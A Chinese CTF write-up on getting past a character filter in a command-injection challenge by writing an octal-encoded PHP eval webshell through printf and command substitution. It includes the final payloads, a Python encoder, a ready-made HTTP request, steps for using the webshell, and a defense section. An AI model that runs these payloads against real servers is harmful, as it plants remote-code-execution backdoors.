## 概述

本文档记录一道经典CTF题目的完整利用链复现：在Linux命令注入场景下，攻击者面临严格的字符过滤限制——**必须使用 `echo` 命令写入Webshell，但输入中不能出现 `e`、`c`、`h`、`o` 这四个字符**，同时 `cat`、`tee`、`wget`、`curl`、`less`、`more` 等包含关键字的命令也被禁用。

核心突破思路是利用 **八进制编码** 将 `echo` 命令及其参数进行编码，配合 `printf` 的转义序列解码功能，再通过 **命令替换 `$(...)`** 执行解码后的命令，最后利用 **反引号 `` `...` `` 内的通配符扩展** 解决重定向文件名生成问题，最终实现无字符限制的Webshell写入。

## 技术原理

### 八进制编码与 printf 解码

- **八进制基数为 8**，仅使用数字 0-7，天然不包含 `e` `c` `h` `o` 等字母字符
- `printf` 支持 `\NNN` 形式的八进制转义序列（N 为 0-7），可将八进制字节还原为对应 ASCII 字符
- 示例：`printf "\145\143\150\157"` 输出 `echo`

### 命令替换与执行顺序

- `$(...)` 会优先执行括号内命令，并将标准输出替换到原命令位置
- `$(printf "\145\143\150\157")` 先解码为 `echo`，再作为命令执行

### 重定向在命令替换中的行为差异

- 直接在 `$()` 内包含重定向符 `>` 会导致重定向针对子 Shell 而非当前 Shell，造成写入失败或内容被输出到终端
- 需将重定向符移至命令替换外部

### 反引号与通配符扩展生成文件名

- 反引号 `` `...` `` 同样执行命令替换，但其内部支持 Shell 通配符扩展
- `` `ls t*.*` `` 可匹配当前目录下符合模式的文件名（如 `test.php`），作为重定向目标文件

### 利用 Payload 进化过程

#### 尝试 1：直接命令替换执行（失败）

```bash
$(printf "\145\143\150\157\040\042\074\077\160\150\160\040\100\145\166\141\154\050\044\137\120\117\123\124\133\047\143\047\135\051\073\077\076\042\040\076\040\163\150\145\154\154\056\160\150\160")
```

**问题**：重定向 `>` 在子 Shell 中生效，内容被输出到终端而非写入文件。

#### 尝试 2：重定向移至外部，通配符未生效（失败）

```bash
$(printf "\145\143\150\157\040\042\074\077\160\150\160\040\100\145\166\141\154\050\044\137\120\117\123\124\133\047\143\047\135\051\073\077\076\042")>>shell.php
```

**问题**：`*` 未被当作通配符解释（受 `system()`/`exec()`/`shell_exec()` 等函数调用方式影响，Shell 不展开通配符）。

#### 最终 Payload：反引号配合 ls 通配符生成文件名（成功）

```bash
vul=;$(printf "\145\143\150\157\040\042\074\077\160\150\160\040\100\145\166\141\154\050\044\137\120\117\123\124\133\047\143\047\135\051\073\077\076\042")>>`ls t*.*`
```

**关键点解析**：

| 片段 | 作用 |
|------|------|
| `vul=;` | 假设注入点在 `vul` 参数后，分号截断原命令 |
| `$(printf "...")` | 解码并执行 `echo "<?php @eval($_POST['c']);?>"` |
| `>>` | 追加重定向，写入文件 |
| `` `ls t*.*` `` | 反引号内执行 `ls t*.*`，Shell 展开通配符匹配现有文件（如 `test.php`），作为重定向目标 |

> **前置条件**：目标目录下需存在匹配 `t*.*` 模式的文件（如 `test.php`），否则 `ls` 无输出导致重定向失败。实战中可先通过其他方式上传/创建符合模式的文件，或利用已知文件名。

## 实战复现步骤

1. **确认注入点**  
   如 `http://target.com/vul.php?vul=test`，经测试 `vul=;id` 可执行命令。

2. **验证字符过滤规则**  
   尝试输入 `echo`、`cat`、`wget` 等，观察拦截响应，确认 `e` `c` `h` `o` 及关键命令被过滤。

3. **准备目标文件**  
   确保 Web 目录下存在 `test.php` 或其他 `t*.*` 文件；若无，尝试通过其他漏洞（如文件上传）创建。

4. **构造八进制 Payload**  
   使用 Python/在线工具将目标 `echo` 语句转为八进制转义序列：
   ```python
   payload = 'echo "<?php @eval($_POST[\'c\']);?>"'
   encoded = ''.join(f'\\{oct(ord(c))[2:]}' for c in payload)
   print(encoded)
   ```

5. **发送最终 Payload**  
   ```http
   GET /vul.php?vul=;$(printf "\145\143\150\157\040\042\074\077\160\150\160\040\100\145\166\141\154\050\044\137\120\117\123\124\133\047\143\047\135\051\073\077\076\042")>>`ls t*.*` HTTP/1.1
   ```

6. **验证 Webshell**  
   访问 `http://target.com/shell.php`（或匹配的文件名），使用密码 `c` 连接蚁剑/菜刀确认可用。

## 常见问题与对抗思路

| 问题 | 原因 | 绕过/修复建议 |
|------|------|---------------|
| `*` 不展开 | PHP `system()`/`exec()` 等不调用 Shell 或禁用 glob | 改用反引号 `` `ls t*.*` `` 强制 Shell 展开；或使用 `bash -c` 显式调用 Shell |
| 无匹配文件 | 目录无 `t*.*` 文件 | 先上传任意 `test.php`；或利用已知文件名（如 `index.php`）调整通配符模式 |
| `printf` 不支持 `\NNN` | 极少数嵌入式 Shell 实现缺失 | 改用 `echo -e`（需 `e` 字符）、`awk`、`perl` 等替代解码工具 |
| 空格被过滤 | 过滤规则包含空格 | 使用 `${IFS}`、`$IFS`、`<`、`{cat,flag}` 等 Bash 内置变量/语法替代空格 |

## 防御与检测建议

1. **输入验证与命令拼接分离**  
   避免直接拼接用户输入至 Shell 命令；使用语言原生 API（如 PHP `proc_open` 绕过 Shell、Python `subprocess.run(shell=False)`）执行外部程序。

2. **严格字符白名单**  
   对注入点参数实施白名单校验（仅允许字母数字下划线等），而非依赖黑名单过滤关键字。

3. **禁用危险函数**  
   `php.ini` 中 `disable_functions = exec,shell_exec,system,passthru,popen,proc_open,pcntl_exec,...` 并配合 `open_basedir` 限制文件操作范围。

4. **Webshell 行为检测**  
   - 文件监控：`inotifywait` / `auditd` 实时监控 Web 目录新增/修改 `.php` `.phtml` 等脚本文件
   - 流量特征：检测 `eval`/`assert`/`system` 等高危函数调用、Base64/八进制/异或编码特征、异常 POST 请求体
   - 内存马检测：定期扫描 PHP-FPM 进程内存、排查异常类加载与函数注册

5. **最小权限原则**  
   Web 进程以低权限用户运行，禁用 `sudo`、禁止写入 Web 目录、挂载 `noexec` `nosuid` 分区。

## 小结

本利用链展示了在极端字符限制下，通过 **编码转换（八进制）**、**命令替换（`$()`/`printf`）**、**Shell 语法特性（重定向作用域、反引号通配符展开）** 组合绕过的完整思路。核心启示：

- **编码是绕过字符过滤的通用手段**：八进制、十六进制、Base64、URL 编码、Unicode 等均可尝试
- **Shell 解析顺序决定成败**：理解子 Shell、命令替换、重定向、通配符展开的先后顺序至关重要
- **环境依赖性强**：需目标存在可控文件名、支持 `printf` 八进制转义、Shell 启用通配符展开等前置条件

实战中应结合目标环境灵活组合技术，而非死磕单一路径；防御侧则应从架构层面消除命令拼接风险，配合多层检测体系实现纵深防御。
